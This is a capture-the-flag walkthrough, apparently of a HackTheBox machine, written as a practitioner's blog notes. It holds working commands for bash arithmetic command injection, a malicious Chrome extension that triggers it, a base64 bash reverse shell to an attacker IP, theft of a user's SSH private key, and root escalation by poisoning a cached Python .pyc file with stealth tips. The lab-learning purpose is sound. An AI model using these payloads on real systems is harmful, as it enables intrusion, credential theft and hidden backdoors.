[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)

### Reconnaissance

**Nmap Scan:**

bash

```
nmap -sC -sV -vvv -oA nmap/browsed 10.129.244.79
```

**Key findings:**

- Port 22 → SSH (Ubuntu)
- Port 80 → Nginx (Ubuntu)

**Add target to hosts file:**

bash

```
sudo vi /etc/hosts
# Add: 10.129.244.79 browse.htb
```

**Directory fuzzing with GoBuster (non-recursive, with PHP extension):**

bash

```
gobuster dir -u http://10.129.244.79 -w /opt/list/discovery/web/content/raft-small-words.txt -x php
```

> **Why GoBuster over FeroxBuster here:** GoBuster is easier to configure as non-recursive, reducing noise and rabbit holes during initial recon.

### Web Application Enumeration

**Observations from manual recon:**

`upload.php` was exposed which confirms vanilla PHP (no framework like Laravel ; frameworks typically hide `.php` extensions)

- `/images` returns 403 Forbidden
- `/uploads` does not return 403 which likely means upload directory location unknown
- Source reveals jQuery and `browser.min.js` part of theme, not custom

**Another important aspects:**

- File upload accepts ZIP format only
- Server attempts to unzip uploaded files
- Error message displayed: `failed to unzip file` which confirms server-side unzipping

**I considered using Zip slip technique but deprioritized it due to the below reasons :**

- Upload destination directory unknown which means no known-good success state to validate against
- Without a known success scenario, you cannot distinguish failure from misconfiguration
- Too many uncontrollable failure cases (permissions, wrong path, wrong folder name)

> **Note:** Don’t pursue zip slip without first knowing the upload destination path and being able to verify a success case.

### Subdomain Discovery via Extension Output Analysis

**Download and inspect sample browser extension:**

```
mv ~/Downloads/timer.zip .
mkdir timer && cd timer
unzip timer.zip
cat manifest.json
```

**Inspect extension output for hidden info:**

```
# Paste extension output into a file
vi output.txt
grep -S "hostname" output.txt
```

**My Finding:** Extension output contained `browse-internals.htb` as a second hostname.

**Add new subdomain to hosts file:**

```
sudo vi /etc/hosts
# Add: 10.129.244.79 browse-internals.htb
```

### Internal Application Analysis (Gitea Instance)

**URL:** `http://browse-internals.htb`

- Gitea instance running internally
- User: `larry`
- App: Markdown-to-HTML Flask application
- Route exposed: `/routines/<r_id>`
- Flask app running on `localhost:5000` (not externally accessible)

**Vulnerability identified:** Bash arithmetic injection in `routines` endpoint

**Proof of concept : bash arithmetic injection:**

```
# test.sh
payload=$((x[$1])) 
echo "$payload matched"

bash test.sh 1          # Returns: payload 1
bash test.sh 0          # Returns: matched

# Inject a command inside arithmetic expansion:
bash test.sh '$(sleep 2)'   # Sleeps 2 seconds — confirms RCE
```

> **Note:** Output won’t print to screen because the command executes inside arithmetic context ; use `sleep` to confirm execution via time delay.

### Malicious Browser Extension (RCE via Chrome Extension)

Craft a Chrome extension that makes a background HTTP request to `localhost:5000` on load, triggering the command injection.

**Critical zip packaging rule : make sure to zip from inside directory:**

```
cd pone/
zip ../pone.zip *        # Correct — no parent directory in zip

# WRONG — includes directory wrapper:
zip pone2.zip pone/*
```

**manifest.json file: below are required fields for background execution:**

```
{
  "manifest_version": 3,
  "name": "pone",
  "version": "1.0",
  "permissions": ["webRequest"],
  "background": {
    "service_worker": "background.js"
  }
}
```

> **Key finding:** `webRequest` permission + `background.service_worker` allows code to run automatically on extension load ; no user click required.

**background.js tests callback to your listener:**

```
fetch("http://10.10.15.8:8000/test")
```

**Set up listener before uploading:**

```
nc -lvnp 8000
```

**Confirmed working** → User-Agent in listener shows Chrome → extension is executing.

### Triggering RCE via Extension By Using localhost Flask App

**background.js allows us to hit the vulnerable route:**

```
fetch("http://127.0.0.1:5000/routines/$([curl+http://10.10.15.8:8000])")
```

**Confirm code execution via curl callback:**

```
fetch("http://127.0.0.1:5000/routines/$([curl+http://10.10.15.8:8000])")
// User-Agent in listener will show 'curl' — confirms server-side execution
```

### Reverse Shell Delivery

**Generate clean base64 payload (strip `+` signs to avoid encoding issues):**

```
echo -n "bash -i >& /dev/tcp/10.10.15.8/9001 0>&1" | base64 -w 0
# Adjust spacing to eliminate '+' characters from base64 output
```

**background.js allows you to deliver reverse shell:**

```
fetch("http://127.0.0.1:5000/routines/$([echo+<BASE64>|base64+-d|bash])")
```

**Listener:**

```
nc -lvnp 9001
```

**Upgrade to SSH immediately (more stable than reverse shell):**

```
# On victim — read SSH private key:
cat /home/larry/.ssh/id_rsa

# On attacker — save and use:
vi larry_ssh
chmod 600 larry_ssh
ssh -i larry_ssh larry@10.129.244.79
```

### Privilege Escalation Using Python `__pycache__` Poisoning

**Discover sudo rights:**

```
sudo -l
# Result: can run /opt/extension/extension_tool.py as root
```

**Check pycache permissions:**

```
ls -la /opt/extension/__pycache__/
# Result: drwxrwxrwx (777) — world-writable directory
```

**Inspect compiled `.pyc` file header:**

```
xxd /opt/extension/__pycache__/<file>.cpython-312.pyc | head -2
```

**PyC header structure (16 bytes):**

|Bytes|Content|
|---|---|
|0–3|Magic bytes (Python version)|
|4–7|Timestamp of source `.py` file|
|8–11|File size of source `.py` file|
|12–15|Padding|

> **Key insight:** Python only recompiles `.pyc` if the `.py` file is **newer** or a **different size** than what’s in the header. By copying the original header onto a malicious `.pyc`, Python is tricked into using your file without recompilation.

**Verify magic bytes match Python version:**

```
python3 -c "import sys; print(sys.version)"
# Match magic bytes to correct Python version table
```

**Verify timestamp encoding:**

```
python3 -c "import time; print(hex(int(time.time())))"
# Compare to xxd output of pyc header bytes 4-7 (little-endian)
```

**Create malicious Python payload:**

```
vi /dev/shm/evil.py
```

```
import os
os.system("bash")        # Or mirror original functions for stealth
```

**Compile it:**

```
python3 -m compileall /dev/shm/evil.py
# Creates /dev/shm/__pycache__/evil.cpython-312.pyc
```

**Copy legitimate header over malicious `.pyc` (header transplant):**

```
dd if=/opt/extension/__pycache__/<legit>.pyc \
   of=/dev/shm/__pycache__/evil.cpython-312.pyc \
   bs=1 count=16 conv=notrunc
```

**Verify headers match:**

```
xxd /dev/shm/__pycache__/evil.cpython-312.pyc | head -2
xxd /opt/extension/__pycache__/<legit>.cpython-312.pyc | head -2
```

**Move poisoned file into place (rename trick works because you own the directory):**

```
mv /opt/extension/__pycache__/<legit>.cpython-312.pyc \
      /opt/extension/__pycache__/<legit>.cpython-312.pyc.bak

cp /dev/shm/__pycache__/evil.cpython-312.pyc \
   /opt/extension/__pycache__/<legit>.cpython-312.pyc
```

**Trigger execution as root:**

```
sudo /opt/extension/extension_tool.py clean
# 'clean' triggers the function that maps to os.system("bash")
# Results in root shell
```

### My Final Summary Notes

|Concept|Lesson|
|---|---|
|Zip slip|Only pursue when upload destination is known and a success state can be verified|
|Browser extension abuse|`background.service_worker` + `webRequest` permission enables automatic execution on load|
|Zip packaging|Always zip from inside the target directory — no parent folder wrapper|
|Bash arithmetic injection|Commands inside `$([cmd])` execute but don’t print — use `sleep` to confirm|
|Base64 payload hygiene|Adjust spacing to eliminate `+` from base64 output before using in URLs|
|PyC backdoor technique|Header transplant tricks Python into skipping recompilation ; highly stealthy|
|Directory write vs file write|Owning a directory lets you rename/replace files even without write permission on the file itself|
|SSH over reverse shell|Always pivot to SSH when a key is available ; far more stable|
|Mirror original functions|When poisoning a `.pyc`, mirror the original function signatures to avoid detection via error messages|